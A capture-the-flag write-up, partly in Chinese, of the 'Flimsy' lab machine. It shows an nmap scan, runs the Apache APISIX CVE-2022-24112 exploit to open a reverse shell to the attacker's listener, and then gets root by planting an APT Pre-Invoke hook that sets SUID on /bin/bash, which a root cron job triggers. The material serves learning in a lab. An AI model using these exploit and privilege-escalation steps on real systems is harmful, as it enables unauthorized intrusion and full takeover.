# Flimsy

### Nmap Scaning 

```
	┌─(kali?kali)-[~]
	└──╼sudo nmap 192.168.246.220 -Pn -T4 -sV -sC --min-rate=1000 -p 1-65535
	Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-11 15:45 UTC
	Nmap scan report for 192.168.246.220
	Host is up (0.00063s latency).
	Not shown: 65398 filtered tcp ports (no-response), 132 filtered tcp ports (host-prohibited)
	PORT      STATE  SERVICE    VERSION
	22/tcp    open   ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   3072 62:36:1a:5c:d3:e3:7b:e1:70:f8:a3:b3:1c:4c:24:38 (RSA)
	|   256 ee:25:fc:23:66:05:c0:c1:ec:47:c6:bb:00:c7:4f:53 (ECDSA)
	|_  256 83:5c:51:ac:32:e5:3a:21:7c:f6:c2:cd:93:68:58:d8 (ED25519)
	80/tcp    open   http       nginx 1.18.0 (Ubuntu)
	|_http-title: Upright
	|_http-server-header: nginx/1.18.0 (Ubuntu)
	3306/tcp  open   mysql      MySQL (unauthorized)
	8080/tcp  closed http-proxy
	43500/tcp open   http       OpenResty web app server
	|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
	|_http-server-header: APISIX/2.8
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
	
	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 136.70 seconds
```

### searchsploit

```
┌─(kali?kali)-[~]
└──╼$ searchsploit APISIX
---------------------------------------------------------- ---------------------------------
 Exploit Title                                            |  Path
---------------------------------------------------------- ---------------------------------
Apache APISIX 2.12.1 - Remote Code Execution (RCE)        | multiple/remote/50829.py
---------------------------------------------------------- ---------------------------------
````

### Apache APISIX 2.12.1 - Remote Code Execution (RCE)

```
┌──(kali㉿kali)-[~]
└─$ python 50829.py http://192.168.246.220:43500/ 192.168.45.161 4444

                                   .     ,                                                                                
        _.._ * __*\./ ___  _ \./._ | _ *-+-                                                                               
       (_][_)|_) |/'\     (/,/'\[_)|(_)| |                                                                                
          |                     |                                                                                         
                                                                                                                          
                (CVE-2022-24112)                                                                                          
{ Coded By: Ven3xy  | Github: https://github.com/M4xSec/ }   
```

接收端順利接上但是只有一般權限，先拿個 local.txt

```
┌──(kali㉿kali)-[~/penelope]
└─$ python penelope.py 4444
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.64.2 • 172.17.0.1 • 192.168.45.161
➤  💀 Show Payloads (p) 🏠 Main Menu (m) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from 🐧 192.168.246.220 😍 - Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/192.168.246.220/192.168.246.220.log 📜
franklin@flimsy:/root$ ls
ls: cannot open directory '.': Permission denied
...
franklin@flimsy:/$ cd home/franklin/
franklin@flimsy:/home/franklin$ ls
etcd-v3.4.13-linux-amd64  etcd-v3.4.13-linux-amd64.tar.gz  local.txt
franklin@flimsy:/home/franklin$ cat local.txt 
```

### Crontab 排程管理尋找提權

接下來卡了一段時間。後來去看別人的 writeup 才知道要去工作排程找到以 root 身分執行的檔案

```
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root apt-get update
* * * * * root /root/run.sh
```

因為第二支 `run.sh` 無法編輯，所以朝apt去下手，這邊補一下apt的知識：

> [!NOTE]  
> `apt-get update` 命令會檢查哪些路徑以更新軟體列表，您可以查看 APT 的配置文件和目錄。APT 在執行 `apt-get update` 時會檢查以下路徑：
> 
> 1. 軟體源列表文件：
>     - `/etc/apt/sources.list`：這是 APT 主要使用的軟體源列表文件。它包含了系統配置的軟體源。
>     - `/etc/apt/sources.list.d/`：該目錄下的文件是附加的軟體源列表文件，這些文件將與 `sources.list` 中的源合併。每個文件代表一個軟體源。
> 2. APT 配置文件目錄：
>     - `/etc/apt/apt.conf.d/`：該目錄包含了一系列的 APT 配置文件，這些文件允許您對 APT 的行為進行定制。這些配置文件中的指令會影響到 `apt-get update` 命令的行為。
> 
> `/etc/apt/apt.conf.d` 是一個目錄，通常用於存放針對 APT (Advanced Package Tool) 的配置文件。在這個目錄中，你可以放置以數字開頭的文件，這些數字表示配置文件的優先級，數字越小，優先級越高。例如，`00rooted` 這樣的文件名意味著它會在其他以數字開頭的文件之前被處理。
>

將bash加上SetUID權限，SetUID權限會使得該文件以所有者的身分執行而非現在的呼叫者，所以可以使一般使用者以管理員的身分執行bash：

```
cd /etc/apt/apt.conf.d
echo 'APT::Update::Pre-Invoke {"chmod +s /bin/bash"};' > 00rooted
```

最後在呼叫bash起來就可以拿到系統管理員的flag了：

```
franklin@flimsy:/etc/apt/apt.conf.d$ bash -p
bash-5.0# ls
00rooted          10periodic           20archive        20snapd.conf           70debconf
01-vendor-ubuntu  15update-stamp       20auto-upgrades  50command-not-found    99update-notifier
01autoremove      20apt-esm-hook.conf  20packagekit     50unattended-upgrades
bash-5.0# cd /root
bash-5.0# ls
build.sh  default.etcd  flimsy  nohup.out  proof.txt  run.sh  snap
bash-5.0# cat proof.txt 
```

> [!NOTE]  
> `bash -p` 讓 Bash 不去清除環境變數中的一些特權屬性，比如 SUID 標誌。如果你的 bash 可執行文件設置了 SUID（Set User ID）位，則 bash -p 會保留這些權限，從而允許你以特權（例如 root 權限）運行這個 Shell。